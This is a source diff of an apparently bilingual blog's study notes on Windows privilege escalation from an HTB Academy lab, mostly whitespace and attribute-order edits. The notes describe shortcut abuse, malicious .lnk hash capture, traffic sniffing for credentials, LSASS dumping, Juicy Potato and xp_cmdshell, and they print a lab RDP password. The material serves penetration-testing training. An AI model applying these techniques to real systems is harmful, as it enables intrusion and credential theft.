 <h3>Modify existing shortcut file</h3>
-<p>By modifying an existing Windows shortcut and<code>Target</code>Field sets the path to the required executable program, which can also enable unauthorized access to the folder path.</p>
+<p>By modifying an existing Windows shortcut and <code>Target</code> Field sets the path to the required executable program, which can also enable unauthorized access to the folder path.</p>
 <p>The following steps outline the entire process:</p>
-<p><code>right click</code>Desired shortcut.</p>
-<p>Choose<code>property</code>.</p>
+<p><code>right click</code> Desired shortcut.</p>
+<p>Choose <code>property</code>.</p>
 <ol><li><code>Right-click</code> the desired shortcut.</li><li>Select <code>Properties</code>.</li></ol>
 <img alt="Pasted image 20260322064024" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png"/>
-<p>Within the <code>Target</code> field, modify the path to the intended folder for access.<code>Target</code>field, modify the path to access the target folder.</p>
+<p>Within the <code>Target</code> field, modify the path to the intended folder for access.<code>Target</code> field, modify the path to access the target folder.</p>
 <img alt="Pasted image 20260322064042" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png"/>
 <p>Execute the shortcut command and the command key will be generated</p>
 <ol><li>Execute the Shortcut and cmd will be spawned</li></ol>
 <img alt="Pasted image 20260322064055" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png"/>
-<p>If an existing shortcut file is not available, there are other methods to consider. One option is to transfer the existing shortcut file via an SMB server. Alternatively, we can follow<code>Generating a Malicious.lnk File</code> Use PowerShell to create a new shortcut file as mentioned in the "Interacting with Users" section under the tab. These methods provide flexibility in achieving your goals when using shortcut files.</p>
+<p>If an existing shortcut file is not available, there are other methods to consider. One option is to transfer the existing shortcut file via an SMB server. Alternatively, we can follow <code>Generating a Malicious.lnk File</code> Use PowerShell to create a new shortcut file as mentioned in the "Interacting with Users" section under the tab. These methods provide flexibility in achieving your goals when using shortcut files.</p>
 <pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
 <h2>Supplementary skills</h2>
 <h3>Interact with users</h3>
 <p>Users are sometimes the weakest link in an organization. An overloaded employee working quickly may notice something "anomaly" on the machine while browsing a shared hard drive, clicking on a link, or running a file. As discussed in this module, Windows gives us a huge attack surface and there are many things to check when enumerating local privilege escalation vectors. When we have exhausted all options, we can consider specific means to steal credentials by listening to the user's network traffic/local commands, or attacking known vulnerable services that require user interaction. One of my favorite tricks is to place malicious files around frequently accessed file shares in an attempt to obtain user password hashes so they can be cracked offline later.</p>
 <h4>traffic capture</h4>
-<p>If installed<code>Wireshark</code>, non-privileged users may be able to capture network traffic because the administrator-only access to the Npcap driver option is not enabled by default.</p>
+<p>If installed <code>Wireshark</code>, non-privileged users may be able to capture network traffic because the administrator-only access to the Npcap driver option is not enabled by default.</p>
 <img alt="Pasted image 20260322164838" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png"/>
-<p>Here we can see a rough example of how to capture clear text FTP credentials entered by other users into the same input box. Although unlikely, if<code>Wireshark</code> Installed on the equipment we landed, it's worth trying traffic capture to see what you can capture.</p>
+<p>Here we can see a rough example of how to capture clear text FTP credentials entered by other users into the same input box. Although unlikely, if <code>Wireshark</code> Installed on the equipment we landed, it's worth trying traffic capture to see what you can capture.</p>
 <img alt="Pasted image 20260322164844" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png"/>
-<p>Also, let's say our customer puts us on an attacker machine in the environment. In this case it's worth running first<code>tcpdump</code> or<code>Wireshark</code> Wait for a while to see what types of traffic are traveling over the line and if you notice anything interesting. Tool Network Credentials can be run from our attack device to detect passwords and hashes from a live interface or from a pcap file. It's worth leaving the tool running in the background while evaluating, or testing with pcap to see if you can extract credentials useful for privilege escalation or lateral transfers.</p>
+<p>Also, let's say our customer puts us on an attacker machine in the environment. In this case it's worth running first <code>tcpdump</code> or <code>Wireshark</code> Wait for a while to see what types of traffic are traveling over the line and if you notice anything interesting. Tool Network Credentials can be run from our attack device to detect passwords and hashes from a live interface or from a pcap file. It's worth leaving the tool running in the background while evaluating, or testing with pcap to see if you can extract credentials useful for privilege escalation or lateral transfers.</p>
 <h4>Process command line audit</h4>
 <p>process command line</p>
 <p><strong>Process command line monitoring</strong></p>
@@ -5683,13 +5691,13 @@ set lhost 10.10.15.137
       zh: String.raw`<h2>介绍</h2>
 <p>权限提升的总体目标是将我们对特定系统的访问权限提升到组成员<code>Local Administrators</code>或<code>NT AUTHORITY\SYSTEM</code> 本地系统帐户。然而，在某些情况下，提升到系统上的其他用户就足以实现我们的目标。权限提升通常是任何攻击活动中至关重要的一步。我们需要使用获得的访问权限，或者只有在提升权限的上下文中进行会话后才能找到的某些数据（例如凭据）。在某些情况下，如果客户聘请我们进行“黄金映像”或“工作站突破”类型的评估，权限提升可能是评估的最终目标。权限提升通常对于通过网络继续实现我们的最终目标以及横向移动至关重要。</p>
 <p>话虽如此，我们可能需要提升权限，原因如下：</p>
-<ol><li>在测试客户端的黄金映像Windows 工作站和服务器构建是否存在缺陷时</li><li>在本地提升权限以获取对某些本地资源（例如数据库）的访问权限</li><li>在加入域的计算机上获取<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" target="_blank" rel="noreferrer">NT AUTHORITY\System</a>级别访问权限，从而进入客户端的 Active Directory 环境</li><li>获取凭证以在客户端网络内横向移动或提升权限</li></ol>
+<ol><li>在测试客户端的黄金映像Windows 工作站和服务器构建是否存在缺陷时</li><li>在本地提升权限以获取对某些本地资源（例如数据库）的访问权限</li><li>在加入域的计算机上获取<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">NT AUTHORITY\System</a>级别访问权限，从而进入客户端的 Active Directory 环境</li><li>获取凭证以在客户端网络内横向移动或提升权限</li></ol>
 <p>了解如何执行提权检查并<code>manually</code>在特定场景下尽可能地利用漏洞也至关重要。我们可能会遇到这样的情况：客户将我们安置在一个托管工作站上，该工作站没有互联网访问权限，防火墙严密，USB 端口也被禁用，因此我们无法加载任何工具/辅助脚本。在这种情况下，熟练掌握使用 PowerShell 和 Windows 命令行进行 Windows 提权检查至关重要。</p>
 <p>系统存在巨大的攻击面。我们可以通过以下几种方式来提升权限：</p>
 <ul><li>滥用Windows组权限</li><li>滥用Windows用户权限</li><li>绕过用户账户控制</li><li>滥用弱服务/文件权限</li><li>利用位修补的内核漏洞</li><li>凭证盗窃</li><li>流量捕获</li></ul>
 <p><strong>场景1 - 克服网络限制</strong> 我曾经接到一个任务，在客户端提供的系统上提升权限，该系统没有网络连接，USB 端口也被屏蔽。由于网络访问控制的存在，我无法将攻击机直接接入用户网络来协助我。在评估期间，我已经发现了一个网络漏洞，其中打印机 VLAN 配置为允许通过端口 80、443 和 445 进行出站通信。我使用手动枚举方法找到了一个与权限相关的漏洞，该漏洞允许我提升权限并手动执行<code>LSASS</code>进程的内存转储。之后，我能够在打印机 VLAN 上挂载托管在攻击机上的 SMB 共享，并提取<code>LSASS</code>DMP 文件。有了这个文件，我使用<code>Mimikatz</code>离线方式检索了域管理员的 NTLM 密码哈希，我可以离线破解该哈希，并使用该哈希从客户端提供的系统访问域控制器。</p>
-<p><strong>场景2 - 掠夺公开股份</strong> 在另一次评估中，我发现自己处于一个相当封闭的环境中，该环境受到良好的监控，没有任何明显的配置缺陷或正在使用的易受攻击的服务/应用程序。我发现了一个完全开放的文件共享，允许所有用户列出其内容并下载存储在其中的文件。此共享托管了环境中虚拟机的备份。我特别感兴趣的是虚拟硬盘文件（<code>.VMDK</code>和<code>.VHDX</code>文件）。我可以从 Windows VM 访问此共享，将<code>.VHDX</code>虚拟硬盘挂载为本地驱动器并浏览文件系统。从这里，我检索了<code>SYSTEM</code>、<code>SAM</code>和注册表配置单元，将它们移动到我的 Linux 攻击箱中，并使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noreferrer">secretsdump.py</a><code>SECURITY</code>工具提取了本地管理员密码哈希。该组织恰好使用的是黄金映像，并且可以使用本地管理员哈希通过传递哈希攻击获得几乎所有 Windows 系统的管理员访问权限。</p>
-<p><strong>场景3 - 获取凭证并滥用账户权限</strong> 在最后一个场景中，我被置于一个相当封闭的网络中，目标是访问关键的数据库服务器。客户给我提供了一台带有标准域用户账户的笔记本电脑，我可以在上面加载工具。最终，我运行了<a href="https://github.com/SnaffCon/Snaffler" target="_blank" rel="noreferrer">Snaffler</a>工具来搜索文件共享中的敏感信息。我发现一些<code>.sql</code>文件包含指向他们其中一台数据库服务器上某个数据库的低权限数据库凭证。我使用本地 MSSQL 客户端，通过数据库凭证连接到数据库，启用<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" target="_blank" rel="noreferrer">xp_cmdshell</a>存储过程并获得本地命令执行权限。使用此服务帐户访问权限，我确认​​我拥有<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" target="_blank" rel="noreferrer">SeImpersonatePrivilege</a>权限，这可以用来进行本地提权。我下载了一个自定义编译版本的<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noreferrer">Juicy Potato</a>到主机以协助提权，并成功添加了本地管理员用户。添加用户的效果并不理想，但我尝试获取信标/反向 Shell 却失败了。通过此访问权限，我能够远程访问数据库主机，并完全控制该公司其中一个客户的数据库。</p>
+<p><strong>场景2 - 掠夺公开股份</strong> 在另一次评估中，我发现自己处于一个相当封闭的环境中，该环境受到良好的监控，没有任何明显的配置缺陷或正在使用的易受攻击的服务/应用程序。我发现了一个完全开放的文件共享，允许所有用户列出其内容并下载存储在其中的文件。此共享托管了环境中虚拟机的备份。我特别感兴趣的是虚拟硬盘文件（<code>.VMDK</code>和<code>.VHDX</code>文件）。我可以从 Windows VM 访问此共享，将<code>.VHDX</code>虚拟硬盘挂载为本地驱动器并浏览文件系统。从这里，我检索了<code>SYSTEM</code>、<code>SAM</code>和注册表配置单元，将它们移动到我的 Linux 攻击箱中，并使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" rel="noreferrer" target="_blank">secretsdump.py</a><code>SECURITY</code>工具提取了本地管理员密码哈希。该组织恰好使用的是黄金映像，并且可以使用本地管理员哈希通过传递哈希攻击获得几乎所有 Windows 系统的管理员访问权限。</p>
+<p><strong>场景3 - 获取凭证并滥用账户权限</strong> 在最后一个场景中，我被置于一个相当封闭的网络中，目标是访问关键的数据库服务器。客户给我提供了一台带有标准域用户账户的笔记本电脑，我可以在上面加载工具。最终，我运行了<a href="https://github.com/SnaffCon/Snaffler" rel="noreferrer" target="_blank">Snaffler</a>工具来搜索文件共享中的敏感信息。我发现一些<code>.sql</code>文件包含指向他们其中一台数据库服务器上某个数据库的低权限数据库凭证。我使用本地 MSSQL 客户端，通过数据库凭证连接到数据库，启用<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noreferrer" target="_blank">xp_cmdshell</a>存储过程并获得本地命令执行权限。使用此服务帐户访问权限，我确认​​我拥有<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a>权限，这可以用来进行本地提权。我下载了一个自定义编译版本的<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a>到主机以协助提权，并成功添加了本地管理员用户。添加用户的效果并不理想，但我尝试获取信标/反向 Shell 却失败了。通过此访问权限，我能够远程访问数据库主机，并完全控制该公司其中一个客户的数据库。</p>
 <p><strong>通过FreeRDP连接</strong> 我们可以通过命令行连接，使用命令<code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code>并在提示符下输入提供的密码。大多数部分都会提供用户凭证<code>htb-student</code>，但有些部分（根据具体内容）会要求您使用其他用户进行 RDP 连接，并提供备用凭证。</p>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student
 
@@ -5723,9 +5731,9 @@ the CA certificate in your certificate store, or the certificate has expired.
 Please look at the OpenSSL documentation on how to add a private CA to the store.
 Do you trust the above certificate? (Y/T/N) y
 Password: </code></pre>
-<p>模块的许多部分都需要一些工具，例如开源脚本、预编译二进制文件和漏洞利用 PoC。如果适用，这些工​​具可以在<code>C:\Tools</code>目标主机的目录中找到。尽管大多数工具都已提供，但您也可以挑战自己，尝试将文件上传到目标主机（使用文件传输模块中展示的技术），甚至可以使用<a href="https://visualstudio.microsoft.com/downloads/" target="_blank" rel="noreferrer">Visual Studio</a>自行编译一些工具。</p>
+<p>模块的许多部分都需要一些工具，例如开源脚本、预编译二进制文件和漏洞利用 PoC。如果适用，这些工​​具可以在<code>C:\Tools</code>目标主机的目录中找到。尽管大多数工具都已提供，但您也可以挑战自己，尝试将文件上传到目标主机（使用文件传输模块中展示的技术），甚至可以使用<a href="https://visualstudio.microsoft.com/downloads/" rel="noreferrer" target="_blank">Visual Studio</a>自行编译一些工具。</p>
 <p><strong>Useful Tools</strong></p>
-<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noreferrer">Seatbelt</a></td><td>用于执行各种本地权限提升检查的 C# 项目</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noreferrer">winPEAS</a></td><td>是一个脚本，用于在 Windows 主机上搜索可能的提权路径。所有检查的说明如下：</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank" rel="noreferrer">PowerUp</a></td><td>用于查找依赖于错误配置的常见 Windows 提权向量的 PowerShell 脚本。它还可以用来利用已发现的一些问题。</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" target="_blank" rel="noreferrer">SharpUp</a></td><td>C# 版本的 PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" target="_blank" rel="noreferrer">JAWS</a></td><td>用 PowerShell 2.0 编写的用于枚举权限提升向量的 PowerShell 脚本</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noreferrer">SessionGopher</a></td><td>是一款 PowerShell 工具，用于查找并解密远程访问工具保存的会话信息。它可以提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noreferrer">Watson</a></td><td>是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noreferrer">LaZagne</a></td><td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地计算机上的密码的工具</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noreferrer">Windows Exploit Suggester - Next Generation</a></td><td>是一款基于 Windows 实用程序输出的工具<code>systeminfo</code>，它提供了操操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方式。它支持 Windows XP 到 Windows 10 之间的所有 Windows 操操作系统，包括其对应的 Windows Server 版本。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noreferrer">Sysinternals Suite</a></td><td>我们将在枚举中使用 Sysinternals 的几种工具，包括<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noreferrer">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" target="_blank" rel="noreferrer">PipeList</a>和<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" target="_blank" rel="noreferrer">PsService</a></td></tr></tbody></table></div>
+<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" rel="noreferrer" target="_blank">Seatbelt</a></td><td>用于执行各种本地权限提升检查的 C# 项目</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" rel="noreferrer" target="_blank">winPEAS</a></td><td>是一个脚本，用于在 Windows 主机上搜索可能的提权路径。所有检查的说明如下：</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" rel="noreferrer" target="_blank">PowerUp</a></td><td>用于查找依赖于错误配置的常见 Windows 提权向量的 PowerShell 脚本。它还可以用来利用已发现的一些问题。</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" rel="noreferrer" target="_blank">SharpUp</a></td><td>C# 版本的 PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" rel="noreferrer" target="_blank">JAWS</a></td><td>用 PowerShell 2.0 编写的用于枚举权限提升向量的 PowerShell 脚本</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a></td><td>是一款 PowerShell 工具，用于查找并解密远程访问工具保存的会话信息。它可以提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" rel="noreferrer" target="_blank">Watson</a></td><td>是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a></td><td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地计算机上的密码的工具</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" rel="noreferrer" target="_blank">Windows Exploit Suggester - Next Generation</a></td><td>是一款基于 Windows 实用程序输出的工具<code>systeminfo</code>，它提供了操操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方式。它支持 Windows XP 到 Windows 10 之间的所有 Windows 操操作系统，包括其对应的 Windows Server 版本。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">Sysinternals Suite</a></td><td>我们将在枚举中使用 Sysinternals 的几种工具，包括<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" rel="noreferrer" target="_blank">PipeList</a>和<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a></td></tr></tbody></table></div>
 <h2>态势感知与环境摸底</h2>
 <h3>态势感知</h3>
 <p>无论身处何种境地，无论是在日常生活中，还是在网络渗透测试等项目中，时刻把握时间和空间的定位都至关重要。</p>
@@ -5740,7 +5748,7 @@ Password: </code></pre>
 <pre><code class="language-cmd-session">C:\htb&gt; route print</code></pre>
 <p>枚举现有的保护措施将有助于我们确保所使用的方法不会被阻止或检测到，并且在我们必须编写自定义 Payload 或在编译工具之前对其进行修改时，这也会对我们有所帮助。</p>
 <ol><li><strong>枚举保护措施</strong></li></ol>
-<p>许多组织使用某种应用程序白名单解决方案来控制某些用户可以运行哪些类型的应用程序和文件。这可能被用来尝试阻止非管理员用户运行<code>cmd.exe</code>其<code>PowerShell.exe</code>日常工作不需要的其他二进制文件和文件类型。Microsoft 提供的一个常用解决方案是<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" target="_blank" rel="noreferrer">AppLocker</a>。我们可以使用<a href="https://docs.microsoft.com/en-us/PowerShell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" target="_blank" rel="noreferrer">GetAppLockerPolicy</a> cmdlet 枚举本地、有效（强制执行）和域 AppLocker 策略。这将帮助我们了解哪些二进制文件或文件类型可能被阻止，以及我们是否需要在枚举过程中或在运行工具或技术来提升权限之前执行某种 AppLocker 绕过。</p>
+<p>许多组织使用某种应用程序白名单解决方案来控制某些用户可以运行哪些类型的应用程序和文件。这可能被用来尝试阻止非管理员用户运行<code>cmd.exe</code>其<code>PowerShell.exe</code>日常工作不需要的其他二进制文件和文件类型。Microsoft 提供的一个常用解决方案是<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" rel="noreferrer" target="_blank">AppLocker</a>。我们可以使用<a href="https://docs.microsoft.com/en-us/PowerShell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" rel="noreferrer" target="_blank">GetAppLockerPolicy</a> cmdlet 枚举本地、有效（强制执行）和域 AppLocker 策略。这将帮助我们了解哪些二进制文件或文件类型可能被阻止，以及我们是否需要在枚举过程中或在运行工具或技术来提升权限之前执行某种 AppLocker 绕过。</p>
 <ul><li>检查Windows Defender状态</li></ul>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-MpComputerStatus
 
@@ -5894,11 +5902,11 @@ PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows
 </code></pre>
 <h3>初始枚举</h3>
 <p>在评估过程中，我们可能会在 Windows 主机上获得低权限的 shell（无论是否已加入域），需要进行权限提升以进一步访问。完全入侵主机可能会让我们访问敏感文件/文件共享，获得捕获流量以获取更多凭证的能力，或者获得有助于进一步提升访问权限的凭证，甚至直接升级到 Active Directory 环境中的域管理员权限。根据系统配置和遇到的数据类型，我们可以将权限升级为以下之一：</p>
-<ul><li>高度特权的 <code>NT AUTHORITY\SYSTEM</code> 账户，或称 <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" target="_blank" rel="noreferrer">LocalSystem</a> 账户，这是一个拥有比本地管理员账户更多权限的高度特权账户，用于运行大多数 Windows 服务。</li><li>内置的本地<code>管理员</code>账户。有些组织禁用了该账户，但许多组织不会。在客户端环境中，该账户在多个系统间重复使用并不罕见。</li><li>另一个本地账户，是本地<code>管理员</code>组的成员。该组中的任何账户都将拥有与内置<code>管理员</code>账户相同的权限。</li><li>一个标准（非特权）域用户，属于本地<code>管理员</code>组。</li><li>一个域管理员（在 Active Directory 环境中拥有高度权限），属于本地<code>管理员组</code> 。</li></ul>
+<ul><li>高度特权的 <code>NT AUTHORITY\SYSTEM</code> 账户，或称 <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">LocalSystem</a> 账户，这是一个拥有比本地管理员账户更多权限的高度特权账户，用于运行大多数 Windows 服务。</li><li>内置的本地<code>管理员</code>账户。有些组织禁用了该账户，但许多组织不会。在客户端环境中，该账户在多个系统间重复使用并不罕见。</li><li>另一个本地账户，是本地<code>管理员</code>组的成员。该组中的任何账户都将拥有与内置<code>管理员</code>账户相同的权限。</li><li>一个标准（非特权）域用户，属于本地<code>管理员</code>组。</li><li>一个域管理员（在 Active Directory 环境中拥有高度权限），属于本地<code>管理员组</code> 。</li></ul>
 <p><strong>关键数据点</strong></p>
 <ul><li><code>OS name</code> <code>系统名称</code> ：了解 Windows 操作系统的类型（工作站或服务器）和级别（Windows 7 或 10，Server 2008、2012、2016、2019 等）可以让我们了解遗留系统中可能可用的工具类型（如 <code>PowerShell</code> 版本），或是否缺乏这些工具。这也能识别可能存在公开漏洞利用的操作系统版本。</li><li><code>Version</code>: 与操作系统版本类似，可能存在针对特定 Windows 版本漏洞的公开漏洞利用。Windows 系统漏洞可能导致系统不稳定甚至彻底崩溃。在任何生产系统上运行这些程序时都要小心，确保在运行前充分了解漏洞及其可能的后果。</li><li><code>Running Services</code> <code>运行服务</code> ：了解主机上运行的服务很重要，尤其是那些以 <code>NT AUTHORITY\SYSTEM</code> 或管理员级账户运行的服务。在特权账户中运行的服务配置错误或易受攻击，往往是权限升级的轻松优势。</li></ul>
 <h4>系统信息</h4>
-<p>查看系统本身能让我们更好地了解具体操作系统版本、使用的硬件、已安装的程序和安全更新。这将帮助我们缩小寻找缺失补丁及相关 CVE 的范围，以便升级权限。使用<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" target="_blank" rel="noreferrer">Tasklist</a>命令查看正在运行的进程，可以让我们更好地了解系统当前运行的应用程序。</p>
+<p>查看系统本身能让我们更好地了解具体操作系统版本、使用的硬件、已安装的程序和安全更新。这将帮助我们缩小寻找缺失补丁及相关 CVE 的范围，以便升级权限。使用<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" rel="noreferrer" target="_blank">Tasklist</a>命令查看正在运行的进程，可以让我们更好地了解系统当前运行的应用程序。</p>
 <pre><code class="language-cmd">Tasklist</code></pre>
 <pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc
 
@@ -5948,7 +5956,7 @@ TrustedInstaller.exe          1120 TrustedInstaller
 TiWorker.exe                  1816 N/A
 WmiApSrv.exe                  2428 wmiApSrv
 tasklist.exe                  3596 N/A</code></pre>
-<p>熟悉标准的 Windows 进程，如会话管理器子系统（smss.exe）、 客户端服务器运行时子系统（csrss.exe）、<a href="https://en.wikipedia.org/wiki/Winlogon" target="_blank" rel="noreferrer">WinLogon（winlogon.exe）、</a> 本地安全机构子系统服务（LSASS） 和服务主机（svchost.exe） 等，以及与之相关的服务，是至关重要的。能够快速识别标准流程/服务将有助于加快我们的枚举速度，并使我们能够聚焦非标准流程/服务，从而可能开启权限升级的路径。在上述示例中，我们最感兴趣的是 <code>FileZilla</code> FTP 服务器的运行情况，并尝试枚举版本以查找公开漏洞或错误配置，如 FTP 匿名访问，这些可能导致敏感数据暴露甚至更多。</p>
+<p>熟悉标准的 Windows 进程，如会话管理器子系统（smss.exe）、 客户端服务器运行时子系统（csrss.exe）、<a href="https://en.wikipedia.org/wiki/Winlogon" rel="noreferrer" target="_blank">WinLogon（winlogon.exe）、</a> 本地安全机构子系统服务（LSASS） 和服务主机（svchost.exe） 等，以及与之相关的服务，是至关重要的。能够快速识别标准流程/服务将有助于加快我们的枚举速度，并使我们能够聚焦非标准流程/服务，从而可能开启权限升级的路径。在上述示例中，我们最感兴趣的是 <code>FileZilla</code> FTP 服务器的运行情况，并尝试枚举版本以查找公开漏洞或错误配置，如 FTP 匿名访问，这些可能导致敏感数据暴露甚至更多。</p>
 <p>其他流程，比如 <code>MsMpEng.exe</code>、Windows Defender，也很有趣，因为它们可以帮助我们规划目标主机上可能需要规避或绕过的防护措施。</p>
 <p><strong>显示所有环境变量</strong> 环境变量解释了主机配置的很多情况。要打印它们，Windows 会提供 <code>set</code> 命令。<code>PATH</code> 是最常被忽视的变量之一。在下面的输出中，没有任何异常。然而，管理员（或应用程序）修改 <code>PATH</code> 的情况并不罕见。一个常见的例子是将 Python 或 Java 置于路径中，这样可以执行 Python 或 。JAR 文件。如果放置在 PATH 中的文件夹是用户可写的，可能可以对其他应用程序进行 DLL 注入。记住，运行程序时，Windows 首先会在 CWD（当前工作目录）中查找该程序，然后从左到右从 PATH 查找该程序。这意味着如果自定义路径放在左侧（在 C：\Windows\System32 之前），它比右侧危险得多。</p>
 <p>除了 PATH， <code>set</code>还可以提供其他有用信息，比如 HOME DRIVE。在企业中，这通常是文件共享。直接进入文件共享页面可能会显示其他可访问的目录。能够访问“IT 目录”并不罕见，该目录包含包含密码的库存表格。此外，共享用于家庭目录，用户可以登录其他电脑，拥有相同的体验/文件/桌面等（ 漫游配置文件 ）。这也可能意味着用户会携带恶意物品。如果文件被放置在 <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code> 中，当用户登录另一台机器时，该文件将被执行。</p>
@@ -6047,7 +6055,7 @@ Network Card(s):           2 NIC(s) Installed.
                                  [01]: 192.168.20.56
                                  [02]: fe80::f055:fefd:b1b:9919
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
-<p><strong>补丁与更新</strong> 如果 <code>systeminfo</code> 不显示热修复，可以通过 <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" target="_blank" rel="noreferrer">WMI-Command</a> 二进制和 QFE（快速修复工程） 来查询补丁。</p>
+<p><strong>补丁与更新</strong> 如果 <code>systeminfo</code> 不显示热修复，可以通过 <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" rel="noreferrer" target="_blank">WMI-Command</a> 二进制和 QFE（快速修复工程） 来查询补丁。</p>
 <pre><code class="language-cmd-session">C:\htb&gt; wmic qfe
 
 Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
@@ -6101,7 +6109,7 @@ Browser for SQL Server 2016                                             13.2.502
 Integration Services                                                    15.0.2000.130
 
 &lt;SNIP&gt;</code></pre>
-<p><strong>显示运行进程</strong> <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" target="_blank" rel="noreferrer">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机（登录主机时）才能访问的有漏洞服务，可以利用它来升级权限。</p>
+<p><strong>显示运行进程</strong> <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机（登录主机时）才能访问的有漏洞服务，可以利用它来升级权限。</p>
 <pre><code class="language-cmd-session">PS C:\htb&gt; netstat -ano
 
 Active Connections
@@ -6126,7 +6134,7 @@ tasklist /svc | findstr 2400
 
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 &gt;administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM</code></pre>
